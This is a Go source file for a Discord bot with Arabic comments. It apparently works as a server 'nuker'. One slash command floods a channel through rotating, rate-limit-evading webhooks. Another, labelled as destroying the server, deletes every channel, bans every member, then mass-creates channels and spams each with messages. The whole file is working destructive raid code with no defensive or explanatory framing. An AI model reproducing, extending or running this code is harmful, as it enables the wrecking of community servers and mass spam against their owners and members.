package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

var httpClient = &http.Client{
	Timeout: 10 * time.Second,
}

func main() {
	token := os.Getenv("MASTERGUARD_TOKEN")
	if token == "" {
		fmt.Println("❌ خطأ: متغير البيئة MASTERGUARD_TOKEN غير موجود")
		return
	}

	sess, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("خطأ في إنشاء جلسة البوت:", err)
		return
	}

	sess.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMembers | discordgo.IntentsGuildMessages

	// تعريف الأوامر
	cmdWhSpam := "wh_spam"
	commandWhSpam := &discordgo.ApplicationCommand{
		Name:        cmdWhSpam,
		Description: "سبام ويب هوك (5 ويب هوكات، 5 ثواني، حذف، وتكرار)",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionChannel,
				Name:        "channel",
				Description: "الروم المستهدف",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "message_content",
				Description: "محتوى الرسالة",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "webhook_name",
				Description: "اسم الويب هوك",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "messages_count",
				Description: "عدد الرسائل الإجمالي المطلوب",
				Required:    true,
			},
		},
	}

	cmdDestroy := "destroy_server"
	commandDestroy := &discordgo.ApplicationCommand{
		Name:        cmdDestroy,
		Description: "أمر تدمير السيرفر (حذف، تبنيد، وسبام)",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "room_name",
				Description: "اسم الرومات الجديدة",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "rooms_count",
				Description: "عدد الرومات",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "message_content",
				Description: "محتوى الرسالة",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "messages_count",
				Description: "عدد الرسائل في كل روم",
				Required:    true,
			},
		},
	}

	sess.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
		if i.Type != discordgo.InteractionApplicationCommand {
			return
		}

		if i.Member == nil || (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "❌ هذا الأمر للمشرفين فقط.",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			return
		}

		cmdName := i.ApplicationCommandData().Name

		if cmdName == cmdWhSpam {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "🚀 جاري تنفيذ سبام الويب هوك...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range i.ApplicationCommandData().Options {
				optionMap[opt.Name] = opt
			}

			channelID := optionMap["channel"].ChannelValue(s).ID
			messageContent := optionMap["message_content"].StringValue()
			webhookName := optionMap["webhook_name"].StringValue()
			messagesCount := int(optionMap["messages_count"].IntValue())

			go runWebhookSpamLoop(token, channelID, webhookName, messageContent, messagesCount, s)

		} else if cmdName == cmdDestroy {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "🚀 جاري تنفيذ أمر التدمير...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range i.ApplicationCommandData().Options {
				optionMap[opt.Name] = opt
			}

			roomName := optionMap["room_name"].StringValue()
			roomsCount := int(optionMap["rooms_count"].IntValue())
			messageContent := optionMap["message_content"].StringValue()
			messagesCount := int(optionMap["messages_count"].IntValue())
			guildID := i.GuildID

			go executeDestruction(s, token, guildID, roomName, roomsCount, messageContent, messagesCount)
		}
	})

	err = sess.Open()
	if err != nil {
		fmt.Println("خطأ في تشغيل الجلسة:", err)
		return
	}

	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandWhSpam)
	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandDestroy)
	fmt.Println("🤖 البوت شغال الآن بنجاح!")

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-stop

	sess.Close()
}

// ==========================================
// منطق أمر الويب هوك المعدل والمستقر
// ==========================================

func runWebhookSpamLoop(token, channelID, webhookName, messageContent string, totalGoal int, s *discordgo.Session) {
	sentCounter := 0
	var mu sync.Mutex

	for {
		mu.Lock()
		if sentCounter >= totalGoal {
			mu.Unlock()
			break
		}
		mu.Unlock()

		urls := createFiveWebhooks(token, channelID, webhookName)
		if len(urls) == 0 {
			time.Sleep(1 * time.Second)
			continue
		}

		burstSendForFiveSeconds(urls, messageContent, &sentCounter, totalGoal, &mu)
		deleteFiveWebhooks(token, urls)
	}

	s.ChannelMessageSend(channelID, "🎉 تم الانتهاء من عدد رسائل الويب هوك المطلوبة!")
}

func createFiveWebhooks(token, channelID, webhookName string) []string {
	headers := map[string]string{
		"Authorization": "Bot " + token,
		"Content-Type":  "application/json",
	}

	var activeURLs []string
	var mu sync.Mutex
	var wg sync.WaitGroup

	for i := 0; i < 5; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			payload, _ := json.Marshal(map[string]string{"name": webhookName})
			req, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+channelID+"/webhooks", bytes.NewBuffer(payload))
			for k, v := range headers {
				req.Header.Set(k, v)
			}

			resp, err := httpClient.Do(req)
			if err != nil {
				return
			}
			defer resp.Body.Close()

			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
				var wh map[string]interface{}
				if err := json.NewDecoder(resp.Body).Decode(&wh); err == nil {
					if id, ok := wh["id"].(string); ok {
						if tkn, ok := wh["token"].(string); ok {
							url := fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tkn)
							mu.Lock()
							activeURLs = append(activeURLs, url)
							mu.Unlock()
						}
					}
				}
			}
		}()
	}
	wg.Wait()
	return activeURLs
}

func deleteFiveWebhooks(token string, urls []string) {
	headers := map[string]string{
		"Authorization": "Bot " + token,
	}

	var wg sync.WaitGroup
	for _, url := range urls {
		wg.Add(1)
		go func(whURL string) {
			defer wg.Done()
			req, _ := http.NewRequest("DELETE", whURL, nil)
			for k, v := range headers {
				req.Header.Set(k, v)
			}
			resp, err := httpClient.Do(req)
			if err == nil {
				resp.Body.Close()
			}
		}(url)
	}
	wg.Wait()
}

func burstSendForFiveSeconds(urls []string, messageContent string, sentCounter *int, totalGoal int, mu *sync.Mutex) {
	stopSignal := make(chan struct{})
	var wg sync.WaitGroup

	for _, url := range urls {
		wg.Add(1)
		go func(whURL string) {
			defer wg.Done()
			for {
				select {
				case <-stopSignal:
					return
				default:
				}

				mu.Lock()
				if *sentCounter >= totalGoal {
					mu.Unlock()
					select {
					case stopSignal <- struct{}{}:
					default:
					}
					return
				}
				mu.Unlock()

				msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
				req, _ := http.NewRequest("POST", whURL, bytes.NewBuffer(msgPayload))
				req.Header.Set("Content-Type", "application/json")

				resp, err := httpClient.Do(req)
				if err != nil {
					time.Sleep(50 * time.Millisecond)
					continue
				}

				if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
					mu.Lock()
					*sentCounter++
					mu.Unlock()
				} else if resp.StatusCode == 429 {
					resp.Body.Close()
					time.Sleep(250 * time.Millisecond)
					continue
				}
				resp.Body.Close()
			}
		}(url)
	}

	time.Sleep(5 * time.Second)
	select {
	case stopSignal <- struct{}{}:
	default:
	}
	wg.Wait()
}

// ==========================================
// منطق أمر التدمير (destroy_server)
// ==========================================

func executeDestruction(s *discordgo.Session, token, guildID, roomName string, roomsCount int, messageContent string, messagesCount int) {
	headers := map[string]string{
		"Authorization": "Bot " + token,
		"Content-Type":  "application/json",
	}

	go func() {
		req, _ := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		resp, err := httpClient.Do(req)
		if err != nil {
			return
		}
		defer resp.Body.Close()

		var channels []map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&channels)

		for _, ch := range channels {
			if id, ok := ch["id"].(string); ok {
				go func(chID string) {
					delReq, _ := http.NewRequest("DELETE", "https://discord.com/api/v10/channels/"+chID, nil)
					for k, v := range headers {
						delReq.Header.Set(k, v)
					}
					if r, e := httpClient.Do(delReq); e == nil {
						r.Body.Close()
					}
				}(id)
			}
		}
	}()

	go func() {
		var userIDs []string
		after := ""
		for {
			members, err := s.GuildMembers(guildID, after, 1000)
			if err != nil || len(members) == 0 {
				break
			}
			for _, member := range members {
				userIDs = append(userIDs, member.User.ID)
				after = member.User.ID
			}
			if len(members) < 1000 {
				break
			}
		}

		go func() {
			for _, uID := range userIDs {
				s.GuildBanCreate(guildID, uID, 0)
			}
		}()
	}()

	var channelIDs []string
	var mu sync.Mutex
	var wg sync.WaitGroup

	for i := 0; i < roomsCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			payload, _ := json.Marshal(map[string]interface{}{
				"name": roomName,
				"type": 0,
			})
			req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(payload))
			for k, v := range headers {
				req.Header.Set(k, v)
			}

			resp, err := httpClient.Do(req)
			if err != nil {
				return
			}
			defer resp.Body.Close()

			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
				var chResult map[string]interface{}
				json.NewDecoder(resp.Body).Decode(&chResult)
				if chID, ok := chResult["id"].(string); ok {
					mu.Lock()
					channelIDs = append(channelIDs, chID)
					mu.Unlock()
				}
			}
		}()
	}
	wg.Wait()

	for _, chID := range channelIDs {
		go func(cID string) {
			for m := 0; m < messagesCount; m++ {
				go func() {
					msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
					msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+cID+"/messages", bytes.NewBuffer(msgPayload))
					for k, v := range headers {
						msgReq.Header.Set(k, v)
					}

					msgResp, err := httpClient.Do(msgReq)
					if err == nil {
						msgResp.Body.Close()
					}
				}()
			}
		}(chID)
	}
}
